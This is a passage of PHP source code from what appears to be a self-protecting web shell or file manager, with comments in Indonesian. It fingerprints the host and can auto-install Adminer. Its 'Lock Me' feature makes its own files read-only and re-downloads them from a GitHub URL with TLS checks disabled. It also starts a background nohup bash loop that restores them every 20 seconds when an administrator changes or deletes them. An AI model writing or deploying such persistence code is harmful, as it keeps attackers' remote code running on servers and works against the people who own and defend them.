    if (is_string($__r) && $__r !== '') $__login_err = $__r;
}

if (FM_AUTH_MODE !== 'none' && !fm_is_authed()) {
    fm_show_auth_gate($__login_err);
}

/* Auto Adminer: ?go=adminer (hanya setelah auth) */
if (isset($_GET['go']) && $_GET['go'] === 'adminer') {
    $adm = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'adminer.php';
    if (!is_file($adm) || filesize($adm) < 1000) {
        $urls = array(
            'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php',
            'https://cdn.jsdelivr.net/npm/adminer@4.8.1/adminer.php',
            'https://www.adminer.org/latest-mysql-en.php',
        );
        $data = false;
        foreach ($urls as $u) {
            if (function_exists('curl_init')) {
                $ch = curl_init($u);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 90);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_USERAGENT, 'ABADINANJAYA-FM');
                $data = curl_exec($ch);
                $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
                if ($data !== false && $code >= 200 && $code < 400 && strlen($data) > 1000 && strpos($data, '<?php') !== false) break;
                $data = false;
            }
            if ($data === false && ini_get('allow_url_fopen')) {
                $ctx = stream_context_create(array(
                    'http' => array('timeout' => 90, 'header' => "User-Agent: ABADINANJAYA-FM\r\n"),
                    'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
                ));
                $data = @file_get_contents($u, false, $ctx);
                if ($data !== false && strlen($data) > 1000 && strpos($data, '<?php') !== false) break;
                $data = false;
            }
        }
        if ($data === false) {
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><body style="font-family:sans-serif;background:#050705;color:#eef7e6;padding:40px">'
                . '<h2>Gagal install Adminer otomatis</h2>'
                . '<p>Download manual dari <a style="color:#c0f000" href="https://www.adminer.org/">adminer.org</a> '
                . 'lalu simpan sebagai <code>adminer.php</code> di folder ini.</p>'
                . '<p><a style="color:#c0f000" href="index.php">Kembali</a></p></body></html>';
            exit;
        }
        if (@file_put_contents($adm, $data) === false) {
            header('Content-Type: text/plain; charset=utf-8');
            echo 'Gagal menulis adminer.php (permission).';
            exit;
        }
    }
    header('Location: adminer.php');
    exit;
}

/* ========== HELPERS ========== */
function fm_utf8_clean($v) {
    if (is_array($v)) {
        $out = array();
        foreach ($v as $k => $item) {
            $out[fm_utf8_clean($k)] = fm_utf8_clean($item);
        }
        return $out;
    }
    if (is_string($v)) {
        // strip invalid UTF-8 / binary so json_encode never fails empty
        if (function_exists('mb_convert_encoding')) {
            $v = @mb_convert_encoding($v, 'UTF-8', 'UTF-8');
        }
        if (function_exists('iconv')) {
            $fixed = @iconv('UTF-8', 'UTF-8//IGNORE', $v);
            if ($fixed !== false) $v = $fixed;
        }
        // remove NULs
        $v = str_replace("\0", '', $v);
        return $v;
    }
    if (is_bool($v) || is_null($v) || is_int($v) || is_float($v)) return $v;
    return (string)$v;
}

function json_out($data, $code = 200) {
    while (ob_get_level() > 0) { @ob_end_clean(); }
    if (!headers_sent()) {
        http_response_code((int)$code);
        header('Content-Type: application/json; charset=utf-8');
        header('Cache-Control: no-store');
        header('X-Content-Type-Options: nosniff');
    }
    $data = fm_utf8_clean($data);
    $flags = 0;
    if (defined('JSON_UNESCAPED_UNICODE')) $flags |= JSON_UNESCAPED_UNICODE;
    if (defined('JSON_UNESCAPED_SLASHES')) $flags |= JSON_UNESCAPED_SLASHES;
    if (defined('JSON_INVALID_UTF8_SUBSTITUTE')) $flags |= JSON_INVALID_UTF8_SUBSTITUTE;
    $json = json_encode($data, $flags);
    if ($json === false || $json === null || $json === '') {
        $json = '{"ok":false,"error":"JSON encode gagal: ' . addslashes(function_exists('json_last_error_msg') ? json_last_error_msg() : 'unknown') . '"}';
        if (!headers_sent()) http_response_code(500);
    }
    echo $json;
    exit;
}
function norm_path($p) { return fm_norm($p); }
function root_norm() { return fm_norm(FM_ROOT); }
function under_root($full) { return fm_path_under(FM_ROOT, $full); }
function safe_path($rel) {
    $rel = str_replace(array('\\', "\0"), array('/', ''), (string)$rel);
    $rel = trim($rel, '/');
    $rel = preg_replace('#/+#', '/', $rel);
    $rel = preg_replace('#^[A-Za-z]:/#', '', $rel);
    $parts = array();
    if ($rel !== '' && $rel !== '.') {
        foreach (explode('/', $rel) as $p) {
            if ($p === '' || $p === '.') continue;
            if ($p === '..') { if ($parts) array_pop($parts); continue; }
            if (preg_match('/[\x00-\x1F]/', $p)) continue;
            $parts[] = $p;
        }
    }
    if ($parts) {
        $root = FM_ROOT;
        // rtrim('/', '/') = '' → path absolut Linux harus tetap diawali /
        if ($root === '/' || $root === '\\' || $root === '') {
            $full = '/' . implode(DIRECTORY_SEPARATOR, $parts);
        } else {
            $full = rtrim($root, "\\/") . DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, $parts);
        }
    } else {
        $full = FM_ROOT;
    }
    $real = @realpath($full);
    if ($real === false) {
        $parent = @realpath(dirname($full));
        if ($parent === false || !under_root($parent)) return false;
        return $full;
    }
    return under_root($real) ? $real : false;
}
function rel_from_full($full) {
    $root = root_norm();
    $path = fm_norm($full);
    if ($path === '' || fm_path_eq($path, $root)) return '';
    $rootCmp = fm_is_win() ? strtolower($root) : $root;
    $pathCmp = fm_is_win() ? strtolower($path) : $path;
    // Windows drive root: C:
    if (preg_match('#^[A-Za-z]:$#', $root)) {
        if (strlen($pathCmp) > 2 && $pathCmp[1] === ':' && $pathCmp[2] === '/' && strtolower($path[0]) === strtolower($root[0])) {
            return substr($path, 3);
        }
        return '';
    }
    // Filesystem root "/" — jangan gabung jadi "//" (bug: home selalu kosong di Linux)
    if ($root === '/' || $root === '') {
        if (isset($pathCmp[0]) && $pathCmp[0] === '/') {
            return ltrim($path, '/');
        }
        return '';
    }
    $prefix = $rootCmp . '/';
    if (strpos($pathCmp, $prefix) === 0) {
        return substr($path, strlen($root) + 1);
    }
    return '';
}
function root_label() {
    $r = root_norm();
    if (preg_match('#^[A-Za-z]:$#', $r)) return $r;
    if ($r === '/' || $r === '') return '/';
    return $r;
}
/**
 * Info kernel / OS lintas platform (Linux, Windows, macOS, BSD, dll).
 * Mengutamakan API PHP + file sistem; shell opsional jika tersedia.
 * @return array{uname:string,os:string,family:string,release:string,version:string,machine:string,host:string,distro:string,kernel:string,arch:string,cpus:string,load:string,uptime:string,user:string,sapi:string,server:string,lines:array}
 */
function fm_kernel_info() {
    $unameA = function_exists('php_uname') ? (string) @php_uname('a') : '';
    $os = function_exists('php_uname') ? (string) @php_uname('s') : (defined('PHP_OS') ? PHP_OS : 'Unknown');
    $host = function_exists('php_uname') ? (string) @php_uname('n') : (isset($_SERVER['SERVER_NAME']) ? (string)$_SERVER['SERVER_NAME'] : '-');
    $release = function_exists('php_uname') ? (string) @php_uname('r') : '';
    $version = function_exists('php_uname') ? (string) @php_uname('v') : '';
    $machine = function_exists('php_uname') ? (string) @php_uname('m') : '';
    $family = defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : (fm_is_win() ? 'Windows' : $os);

    $distro = '';
    $kernel = $release;
    $arch = $machine;
    $cpus = '';
    $load = '';
    $uptime = '';
    $user = '';

    // Current process user
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $pw = @posix_getpwuid(@posix_geteuid());
        if (is_array($pw) && !empty($pw['name'])) $user = (string)$pw['name'];
    }
    if ($user === '' && function_exists('get_current_user')) {
        $cu = @get_current_user();
        if (is_string($cu) && $cu !== '') $user = $cu;
    }
    if ($user === '') {
        foreach (array('USER', 'USERNAME', 'LOGNAME') as $ek) {
            $ev = getenv($ek);
            if (is_string($ev) && $ev !== '') { $user = $ev; break; }
        }
    }

    // ----- Linux / Unix-like -----
    if (!fm_is_win()) {
        // Distro dari /etc/os-release
        $osRel = '';
        foreach (array('/etc/os-release', '/usr/lib/os-release') as $f) {
            if (@is_readable($f)) { $osRel = (string) @file_get_contents($f); if ($osRel !== '') break; }
        }
        if ($osRel !== '') {
            if (preg_match('/^PRETTY_NAME=(.+)$/m', $osRel, $m)) {
                $distro = trim($m[1], " \t\"'");
            } elseif (preg_match('/^NAME=(.+)$/m', $osRel, $m)) {
                $distro = trim($m[1], " \t\"'");
                if (preg_match('/^VERSION=(.+)$/m', $osRel, $m2)) {
                    $distro .= ' ' . trim($m2[1], " \t\"'");
                }
            }
        }
        if ($distro === '' && @is_readable('/etc/redhat-release')) {
            $distro = trim((string) @file_get_contents('/etc/redhat-release'));
        }
        if ($distro === '' && @is_readable('/etc/debian_version')) {
            $distro = 'Debian ' . trim((string) @file_get_contents('/etc/debian_version'));
        }

        // CPU model + count
        if (@is_readable('/proc/cpuinfo')) {
            $ci = (string) @file_get_contents('/proc/cpuinfo');
            $n = preg_match_all('/^processor\s*:/m', $ci);
            if (preg_match('/^model name\s*:\s*(.+)$/m', $ci, $m)) {
                $cpus = trim($m[1]);
                if ($n > 0) $cpus .= ' ×' . $n;
            } elseif ($n > 0) {
                $cpus = $n . ' CPU(s)';
            }
        }
        if ($cpus === '' && ($n = getenv('NUMBER_OF_PROCESSORS')) !== false && $n !== '') {
            $cpus = $n . ' CPU(s)';
        }

        // Load average
        if (function_exists('sys_getloadavg')) {
            $la = @sys_getloadavg();
            if (is_array($la) && count($la) >= 3) {
                $load = sprintf('%.2f %.2f %.2f', $la[0], $la[1], $la[2]);
            }
        }
        if ($load === '' && @is_readable('/proc/loadavg')) {
            $la = trim((string) @file_get_contents('/proc/loadavg'));
            if (preg_match('/^([\d.]+)\s+([\d.]+)\s+([\d.]+)/', $la, $m)) {
                $load = $m[1] . ' ' . $m[2] . ' ' . $m[3];
            }
        }

        // Uptime
        if (@is_readable('/proc/uptime')) {
            $up = trim((string) @file_get_contents('/proc/uptime'));
            $sec = (int) floatval($up);
            if ($sec > 0) {
                $d = intdiv($sec, 86400); $sec %= 86400;
                $h = intdiv($sec, 3600); $sec %= 3600;
                $mi = intdiv($sec, 60);
                $parts = array();
                if ($d > 0) $parts[] = $d . 'd';
                if ($h > 0 || $d > 0) $parts[] = $h . 'h';
                $parts[] = $mi . 'm';
                $uptime = implode(' ', $parts);
            }
        }

        // macOS sw_vers via files if present
        if ($distro === '' && (stripos($os, 'Darwin') !== false || $family === 'Darwin')) {
            $distro = 'macOS';
            if (@is_readable('/System/Library/CoreServices/SystemVersion.plist')) {
                $pl = (string) @file_get_contents('/System/Library/CoreServices/SystemVersion.plist');
                if (preg_match('/ProductVersion<\/key>\s*<string>([^<]+)/', $pl, $m)) {
                    $distro = 'macOS ' . $m[1];
                }
            }
        }
    }

    // ----- Windows -----
    if (fm_is_win()) {
        $cn = getenv('COMPUTERNAME');
        if (is_string($cn) && $cn !== '') $host = $cn;
        $pa = getenv('PROCESSOR_ARCHITECTURE');
        if (is_string($pa) && $pa !== '') $arch = $pa;
        $pi = getenv('PROCESSOR_IDENTIFIER');
        if (is_string($pi) && $pi !== '') $cpus = $pi;
        $np = getenv('NUMBER_OF_PROCESSORS');
        if (is_string($np) && $np !== '') {
            $cpus = ($cpus !== '' ? $cpus . ' · ' : '') . $np . ' logical';
        }
        // Build number from php_uname version: e.g. build 26100
        $distro = 'Windows';
        if (preg_match('/build\s+(\d+)/i', $version . ' ' . $unameA, $m)) {
            $distro = 'Windows build ' . $m[1];
        }
        if (defined('PHP_WINDOWS_VERSION_MAJOR')) {
            $distro = 'Windows ' . PHP_WINDOWS_VERSION_MAJOR
                . (defined('PHP_WINDOWS_VERSION_MINOR') ? '.' . PHP_WINDOWS_VERSION_MINOR : '')
                . (defined('PHP_WINDOWS_VERSION_BUILD') ? ' (build ' . PHP_WINDOWS_VERSION_BUILD . ')' : '');
        }
        // Kernel = NT release
        $kernel = $release !== '' ? $release : $version;
    }

    // Opsional: uname -a via shell kalau ada (lebih lengkap di beberapa host)
    if ($unameA === '' || strlen($unameA) < 8) {
        foreach (array('shell_exec', 'exec') as $runner) {
            if (!function_exists($runner)) continue;
            $d = strtolower((string) @ini_get('disable_functions'));
            if ($d !== '' && strpos($d, strtolower($runner)) !== false) continue;
            if (fm_is_win()) {
                $cmd = 'ver';
            } else {
                $cmd = 'uname -a';
            }
            $out = '';
            if ($runner === 'shell_exec') {
                $out = (string) @shell_exec($cmd . (fm_is_win() ? '' : ' 2>/dev/null'));
            } else {
                $lines = array();
                @exec($cmd, $lines);
                $out = implode(' ', $lines);
            }
            $out = trim($out);
            if ($out !== '') { $unameA = $out; break; }
        }
    }
    if ($unameA === '') {
        $unameA = trim(implode(' ', array_filter(array($os, $host, $release, $version, $machine))));
    }

    $server = isset($_SERVER['SERVER_SOFTWARE']) ? (string)$_SERVER['SERVER_SOFTWARE'] : '-';
    $sapi = defined('PHP_SAPI') ? PHP_SAPI : '-';

    // CPU pendek (buang noise Windows "Family N Model N Stepping N")
    $cpuShort = $cpus;
    if ($cpuShort !== '') {
        $nLog = '';
        if (preg_match('/·\s*(\d+)\s*logical/i', $cpuShort, $mLog)) $nLog = $mLog[1];
        $cpuShort = preg_replace('/\s*Family\s+\d+\s+Model\s+\d+\s+Stepping\s+\d+\s*,?\s*/i', ' ', $cpuShort);
        $cpuShort = preg_replace('/\s*·\s*\d+\s*logical/i', '', $cpuShort);
        $cpuShort = preg_replace('/\s+/', ' ', trim($cpuShort, " \t,"));
        // "Intel64 GenuineIntel" → "GenuineIntel" / "AMD64 AuthenticAMD" → brand
        if (preg_match('/\b(GenuineIntel|AuthenticAMD|Intel|AMD)\b/i', $cpuShort, $mb)) {
            $cpuShort = $mb[1];
            if (strcasecmp($cpuShort, 'GenuineIntel') === 0) $cpuShort = 'Intel';
            if (strcasecmp($cpuShort, 'AuthenticAMD') === 0) $cpuShort = 'AMD';
        }
        if ($nLog !== '') $cpuShort .= ' · ' . $nLog . ' logical';
    }

    // Server pendek (buang ulang "PHP/x.y" di SERVER_SOFTWARE)
    $serverShort = $server;
    if ($serverShort !== '' && $serverShort !== '-') {
        $serverShort = preg_replace('/\s*PHP\/[\d.]+/i', '', $serverShort);
        $serverShort = trim(preg_replace('/\s+/', ' ', $serverShort));
    }

    // OS label: distro kalau ada, else family + release
    $osLabel = $distro !== '' ? $distro : trim($family . ($release !== '' ? ' ' . $release : ''));
    if ($osLabel === '') $osLabel = $os;

    // Baris UI vertikal (label => value) — tanpa duplikat berantakan
    $lines = array();
    $lines['uname'] = $unameA;
    if ($osLabel !== '') $lines['os'] = $osLabel;
    $kVer = $kernel !== '' ? $kernel : $release;
    if ($kVer !== '') $lines['kernel'] = $kVer;
    if ($arch !== '') $lines['arch'] = $arch;
    if ($host !== '') $lines['host'] = $host;
    if ($cpuShort !== '') $lines['cpu'] = $cpuShort;
    if ($load !== '') $lines['load'] = $load;
    if ($uptime !== '') $lines['uptime'] = $uptime;
    if ($user !== '') $lines['user'] = $user;
    $lines['php'] = PHP_VERSION . ' · ' . $sapi;
    if ($serverShort !== '' && $serverShort !== '-') $lines['server'] = $serverShort;

    return array(
        'uname' => $unameA,
        'os' => $os,
        'family' => $family,
        'release' => $release,
        'version' => $version,
        'machine' => $machine,
        'host' => $host,
        'distro' => $distro !== '' ? $distro : $osLabel,
        'kernel' => $kVer,
        'arch' => $arch,
        'cpus' => $cpuShort,
        'load' => $load,
        'uptime' => $uptime,
        'user' => $user,
        'sapi' => $sapi,
        'server' => $serverShort,
        'php' => PHP_VERSION,
        'lines' => $lines,
    );
}

function fm_home_rel() {
    // Prioritas: folder script yang dieksekusi (SCRIPT_FILENAME), lalu __FILE__
    // Supaya home = lokasi FM di disk, bukan selalu root "/"
    $candidates = array();
    if (!empty($_SERVER['SCRIPT_FILENAME'])) {
        $sf = (string)$_SERVER['SCRIPT_FILENAME'];
        $candidates[] = is_dir($sf) ? $sf : dirname($sf);
    }
    if (!empty($_SERVER['SCRIPT_NAME']) && !empty($_SERVER['DOCUMENT_ROOT'])) {
        $sn = str_replace('\\', '/', (string)$_SERVER['SCRIPT_NAME']);
        $dr = rtrim(str_replace('\\', '/', (string)$_SERVER['DOCUMENT_ROOT']), '/');
        $joined = $dr . '/' . ltrim($sn, '/');
        $candidates[] = dirname($joined);
    }
    $candidates[] = dirname(__FILE__);
    foreach ($candidates as $cand) {
        $cand = (string)$cand;
        if ($cand === '') continue;
        // pastikan folder, bukan file
        $rp = @realpath($cand);
        if ($rp !== false) {
            $here = is_dir($rp) ? $rp : dirname($rp);
        } else {
            $here = is_file($cand) ? dirname($cand) : $cand;
        }
        $here = fm_norm($here);
        if ($here === '' || $here === '/' || preg_match('#^[A-Za-z]:$#', $here)) continue;
        if (!under_root($here)) continue;
        $rel = rel_from_full($here);
        if ($rel !== '') return $rel;
    }
    $here = @realpath(dirname(__FILE__));
    if ($here === false) $here = dirname(__FILE__);
    return rel_from_full($here);
}

/* ========== LOCK ME (Linux only) ==========
 * Kunci index.php + abadi_litespeed.php:
 * - chmod 0444 (tanpa chattr — chattr biasanya butuh root)
 * - blokir edit/hapus/rename lewat FM
 * - self-heal: jika hilang/diubah → unduh ulang dari GitHub main
 * Tidak ada proses “unkillable”; proteksi = file + self-heal tiap request.
 */
define('FM_LOCK_GH_INDEX', 'https://raw.githubusercontent.com/BlackNovaHub/AbadiNanJaya/refs/heads/main/index.php');
define('FM_LOCK_GH_LOADER', 'https://raw.githubusercontent.com/BlackNovaHub/AbadiNanJaya/refs/heads/main/abadi_litespeed.php');

function fm_lock_is_linux() {
    if (fm_is_win()) return false;
    if (defined('PHP_OS_FAMILY')) {
        $f = strtolower((string)PHP_OS_FAMILY);
        if ($f === 'windows' || $f === 'darwin') return false;
        if ($f === 'linux') return true;
    }
    $os = strtolower((string)PHP_OS);
    if (strpos($os, 'darwin') !== false || strpos($os, 'mac') !== false) return false;
    return (strpos($os, 'linux') !== false || strpos($os, 'unix') !== false);
}

function fm_lock_state_dir() {
    static $dir = null;
    if ($dir !== null) return $dir;
    $name = 'abadi_data';
    $cands = array(
        '/dev/shm/' . $name,
        '/tmp/' . $name,
    );
    if (function_exists('sys_get_temp_dir')) {
        $sys = @sys_get_temp_dir();
        if (is_string($sys) && $sys !== '') $cands[] = rtrim($sys, "\\/") . DIRECTORY_SEPARATOR . $name;
    }
    foreach ($cands as $d) {
        if (!is_dir($d)) @mkdir($d, 0700, true);
        if (is_dir($d) && is_writable($d)) {
            $dir = $d;
            return $dir;
        }
    }
    // fallback: home FM (kurang ideal)
    $home = @realpath(dirname(__FILE__));
    $dir = $home ? $home : (string)getcwd();
    return $dir;
}

function fm_lock_state_file() {
    $host = !empty($_SERVER['HTTP_HOST']) ? (string)$_SERVER['HTTP_HOST'] : 'cli';
    $key = substr(md5(fm_lock_protect_dir() . '|' . $host), 0, 16);
    return fm_lock_state_dir() . DIRECTORY_SEPARATOR . 'lock_' . $key . '.json';
}

function fm_lock_protect_dir() {
    static $d = null;
    if ($d !== null) return $d;
    if (!empty($_SERVER['SCRIPT_FILENAME'])) {
        $sf = (string)$_SERVER['SCRIPT_FILENAME'];
        $d0 = @realpath(is_dir($sf) ? $sf : dirname($sf));
        if ($d0) { $d = $d0; return $d; }
    }
    $d0 = @realpath(dirname(__FILE__));
    $d = $d0 ? $d0 : dirname(__FILE__);
    return $d;
}

function fm_lock_targets() {
    $base = fm_lock_protect_dir();
    return array(
        'index.php' => $base . DIRECTORY_SEPARATOR . 'index.php',
        'abadi_litespeed.php' => $base . DIRECTORY_SEPARATOR . 'abadi_litespeed.php',
    );
}

function fm_lock_read_state() {
    $f = fm_lock_state_file();
    if (!is_file($f)) return array('enabled' => false);
    $j = @file_get_contents($f);
    if ($j === false || $j === '') return array('enabled' => false);
    $d = @json_decode($j, true);
    if (!is_array($d)) return array('enabled' => false);
    return $d;
}

function fm_lock_write_state($state) {
    $f = fm_lock_state_file();
    $state['updated'] = gmdate('c');
    $json = json_encode($state);
    if ($json === false) return false;
    $ok = @file_put_contents($f, $json, LOCK_EX);
    if ($ok !== false) @chmod($f, 0600);
    // mirror kecil di web dir (backup pointer) — tanpa secret
    $mirror = fm_lock_protect_dir() . DIRECTORY_SEPARATOR . '.abadi_lock';
    $ptr = json_encode(array(
        'enabled' => !empty($state['enabled']),
        'state' => $f,
        'linux' => true,
    ));
    if (!empty($state['enabled'])) {
        if (is_file($mirror)) @chmod($mirror, 0644);
        @file_put_contents($mirror, $ptr);
        @chmod($mirror, 0444);
    } else {
        if (is_file($mirror)) @chmod($mirror, 0644);
        @unlink($mirror);
    }
    return $ok !== false;
}

function fm_lock_shell_ok($fn) {
    if (!function_exists($fn)) return false;
    $d = strtolower((string)@ini_get('disable_functions'));
    if ($d !== '' && strpos($d, strtolower($fn)) !== false) return false;
    return true;
}

function fm_lock_fetch_url($url) {
    $url = (string)$url;
    $body = false;
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 12);
        curl_setopt($ch, CURLOPT_TIMEOUT, 45);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'AbadiLockMe/1.0');
        $body = curl_exec($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($body === false || $code >= 400) $body = false;
    }
    if ($body === false || $body === '') {
        $ctx = stream_context_create(array(
            'http' => array(
                'timeout' => 45,
                'header' => "User-Agent: AbadiLockMe/1.0\r\n",
                'ignore_errors' => true,
            ),
            'ssl' => array('verify_peer' => false, 'verify_peer_name' => false),
        ));
        $body = @file_get_contents($url, false, $ctx);
    }
    if (!is_string($body) || strlen($body) < 64) return false;
    if (strpos($body, '<?php') === false && strpos($body, '<?PHP') === false) return false;
    return $body;
}

function fm_lock_write_protected_file($path, $body) {
    $dir = dirname($path);
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    // tanpa chattr (butuh root) — cukup buka permission lalu tulis ulang
    if (is_file($path)) @chmod($path, 0644);
    $tmp = $path . '.abadi_lock_tmp_' . mt_rand(1000, 9999);
    if (@file_put_contents($tmp, $body) === false) {
        // direct write fallback
        $ok = @file_put_contents($path, $body);
        if ($ok === false) return false;
    } else {
        if (!@rename($tmp, $path)) {
            @unlink($path);
            if (!@rename($tmp, $path)) {
                $ok = @file_put_contents($path, $body);
                @unlink($tmp);
                if ($ok === false) return false;
            }
        }
    }
    @chmod($path, 0444);
    return true;
}

function fm_lock_is_protected_path($full) {
    if (!$full) return false;
    $state = fm_lock_read_state();
    if (empty($state['enabled'])) return false;
    $n = strtolower(str_replace('\\', '/', (string)@realpath($full)));
    if ($n === '' || $n === false) {
        $n = strtolower(str_replace('\\', '/', (string)$full));
    }
    foreach (fm_lock_targets() as $t) {
        $tn = strtolower(str_replace('\\', '/', (string)@realpath($t)));
        if ($tn === '') $tn = strtolower(str_replace('\\', '/', $t));
        if ($tn !== '' && $n === $tn) return true;
        if (strtolower(basename($full)) === strtolower(basename($t))) {
            $base = strtolower(str_replace('\\', '/', fm_lock_protect_dir()));
            if (strpos($n, $base . '/') === 0 || $n === $base . '/' . strtolower(basename($t))) return true;
        }
    }
    // mirror lock file
    if (strtolower(basename($full)) === '.abadi_lock') return true;
    return false;
}

function fm_lock_self_heal($forceGithub = false) {
    if (!fm_lock_is_linux()) return array('ok' => false, 'reason' => 'not_linux');
    $state = fm_lock_read_state();
    if (empty($state['enabled'])) return array('ok' => true, 'enabled' => false);

    $urls = array(
        'index.php' => FM_LOCK_GH_INDEX,
        'abadi_litespeed.php' => FM_LOCK_GH_LOADER,
    );
    $targets = fm_lock_targets();
    $hashes = isset($state['hashes']) && is_array($state['hashes']) ? $state['hashes'] : array();
    $restored = array();
    $errors = array();
    $now = time();
    $lastSync = isset($state['last_sync']) ? (int)$state['last_sync'] : 0;
    // re-sync dari GitHub tiap 5 menit ATAU force
    $needSync = $forceGithub || ($now - $lastSync > 300);

    foreach ($targets as $name => $path) {
        $url = $urls[$name];
        $exists = is_file($path) && filesize($path) > 32;
        $curHash = $exists ? @md5_file($path) : '';
        $wantHash = isset($hashes[$name]) ? $hashes[$name] : '';
        $broken = !$exists || $curHash === '' || $curHash === false;
        $changed = ($wantHash !== '' && $curHash !== '' && !hash_equals($wantHash, $curHash));

        if ($broken || $changed || $needSync) {
            $body = fm_lock_fetch_url($url);
            if ($body === false) {
                $errors[] = $name . ': fetch gagal';
                // broken + no fetch: coba biarkan
                continue;
            }
            $newHash = md5($body);
            // jika hanya needSync dan hash sama, skip write
            if (!$broken && !$changed && $curHash === $newHash) {
                $hashes[$name] = $newHash;
                continue;
            }
            if (!fm_lock_write_protected_file($path, $body)) {
                $errors[] = $name . ': write gagal';
                continue;
            }
            $hashes[$name] = $newHash;
            $restored[] = $name;
        } else {
            // pastikan read-only untuk user web
            @chmod($path, 0444);
        }
    }

    $state['hashes'] = $hashes;
    $state['last_sync'] = $needSync ? $now : $lastSync;
    $state['last_heal'] = $now;
    $state['last_restored'] = $restored;
    fm_lock_write_state($state);

    // coba jaga watchdog ringan (bukan unkillable)
    fm_lock_ensure_watchdog();

    return array(
        'ok' => empty($errors),
        'enabled' => true,
        'restored' => $restored,
        'errors' => $errors,
        'hashes' => $hashes,
    );
}

function fm_lock_watchdog_script() {
    $dir = fm_lock_state_dir();
    return $dir . DIRECTORY_SEPARATOR . 'lock_watch_' . substr(md5(fm_lock_protect_dir()), 0, 12) . '.php';
}

function fm_lock_ensure_watchdog() {
    if (!fm_lock_is_linux()) return false;
    $state = fm_lock_read_state();
    if (empty($state['enabled'])) return false;

    $script = fm_lock_watchdog_script();
    $index = fm_lock_targets();
    $indexPath = $index['index.php'];
    $code = '<?php
// Abadi Lock Me watchdog — restore GitHub copies if missing/changed
error_reporting(0);
$lock = ' . var_export(fm_lock_state_file(), true) . ';
$targets = ' . var_export($index, true) . ';
$urls = array(
  "index.php" => ' . var_export(FM_LOCK_GH_INDEX, true) . ',
  "abadi_litespeed.php" => ' . var_export(FM_LOCK_GH_LOADER, true) . ',
);
$st = @json_decode(@file_get_contents($lock), true);
if (!is_array($st) || empty($st["enabled"])) exit(0);
function _ab_fetch($u){
  $b=false;
  if(function_exists("curl_init")){
    $ch=curl_init($u); curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_TIMEOUT=>40,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_USERAGENT=>"AbadiLockWatch/1"));
    $b=curl_exec($ch); curl_close($ch);
  }
  if($b===false||$b==="") $b=@file_get_contents($u);
  return (is_string($b)&&strlen($b)>64&&strpos($b,"<?php")!==false)?$b:false;
}
function _ab_write($p,$b){
  @chmod($p,0644);
  $t=$p.".tmp_".mt_rand(100,999);
  if(@file_put_contents($t,$b)!==false){ @rename($t,$p); @unlink($t); } else { @file_put_contents($p,$b); }
  @chmod($p,0444);
}
$hashes=isset($st["hashes"])&&is_array($st["hashes"])?$st["hashes"]:array();
$changed=false;
foreach($targets as $n=>$p){
  $ex=is_file($p)&&filesize($p)>32;
  $h=$ex?@md5_file($p):"";
  $want=isset($hashes[$n])?$hashes[$n]:"";
  if(!$ex || ($want && $h && $h!==$want) || !$want){
    $body=_ab_fetch($urls[$n]);
    if($body!==false){ _ab_write($p,$body); $hashes[$n]=md5($body); $changed=true; }
  } else {
    @chmod($p,0444);
  }
}
if($changed){ $st["hashes"]=$hashes; $st["last_heal"]=time(); @file_put_contents($lock,json_encode($st)); }
';
    @file_put_contents($script, $code);
    @chmod($script, 0500);

    // jalankan loop background jika shell ada (bisa di-kill user — tidak disembunyikan)
    $pidFile = $script . '.pid';
    $alive = false;
    if (is_file($pidFile)) {
        $oldPid = (int)trim((string)@file_get_contents($pidFile));
        if ($oldPid > 1 && fm_lock_shell_ok('posix_kill') && function_exists('posix_kill')) {
            $alive = @posix_kill($oldPid, 0);
        } elseif ($oldPid > 1 && is_dir('/proc/' . $oldPid)) {
            $alive = true;
        }
    }
    if (!$alive && (fm_lock_shell_ok('shell_exec') || fm_lock_shell_ok('exec'))) {
        $php = 'php';
        if (defined('PHP_BINARY') && PHP_BINARY) $php = PHP_BINARY;
        $loop = 'nohup bash -c ' . escapeshellarg(
            'while true; do ' . escapeshellcmd($php) . ' ' . escapeshellarg($script) . ' >/dev/null 2>&1; sleep 20; done'
        ) . ' >/dev/null 2>&1 & echo $!';
        $pidOut = '';
        if (fm_lock_shell_ok('shell_exec')) $pidOut = trim((string)@shell_exec($loop));
        elseif (fm_lock_shell_ok('exec')) {
            $lines = array();
            @exec($loop, $lines);
            $pidOut = isset($lines[0]) ? trim($lines[0]) : '';
        }
        if ($pidOut !== '' && ctype_digit($pidOut)) {
            @file_put_contents($pidFile, $pidOut);
            $state['watchdog_pid'] = (int)$pidOut;
            fm_lock_write_state($state);
        }
    }
    return true;
}

function fm_lock_enable() {
    if (!fm_lock_is_linux()) {
        return array('ok' => false, 'error' => 'Lock Me hanya untuk OS Linux');
    }
    $urls = array(
        'index.php' => FM_LOCK_GH_INDEX,
        'abadi_litespeed.php' => FM_LOCK_GH_LOADER,
    );
    $targets = fm_lock_targets();
    $hashes = array();
    $written = array();
    foreach ($targets as $name => $path) {
        $body = fm_lock_fetch_url($urls[$name]);
        if ($body === false) {
            return array('ok' => false, 'error' => 'Gagal unduh ' . $name . ' dari GitHub');
        }
        if (!fm_lock_write_protected_file($path, $body)) {
